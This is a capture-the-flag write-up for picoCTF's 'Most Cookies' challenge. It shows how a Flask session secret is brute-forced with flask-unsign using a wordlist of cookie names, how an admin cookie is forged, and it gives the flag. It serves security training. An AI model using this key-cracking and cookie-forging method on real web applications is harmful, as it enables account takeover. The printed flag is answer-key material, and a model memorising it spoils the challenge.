# Most Cookies
## Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! http://mercury.picoctf.net:6259/

Attached file: server.py
## Solution
When the value of the stored cookie is pasted onto [dCode](https://www.dcode.fr/base-64-encoding), the base64 decoded message shows the following
```
{"very_auth":"blank"}
```
On observing the python file, the code seems to display the flag when the value of "very_auth" is "admin". To use flask unsign to decode the secret key, we need a wordlist containing all the names of the cookies, so I made a file "cookies.txt" containing all the cookies:
```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```
then using
```
flask-unsign --wordlist cookies.txt --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZVDIIA.vjBhTA7p-My1AX52Ks_Dr9H5Kzg --unsign
```
The command above prints the following message on the terminal
```
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'
```
Now that we know the secret cookie, by running the following command
```
flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret "gingersnap"
```
The terminal displays the following
```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZVDKMg.Vfs26CkF-2WbEE_F8zGSGhD5B8k
```
## Answer
Now replacing this signed value with the one displayed on cookies in the website and reloading gives the following message
```
Flag: picoCTF{pwn_4ll_th3_cook1E5_5f016958}
```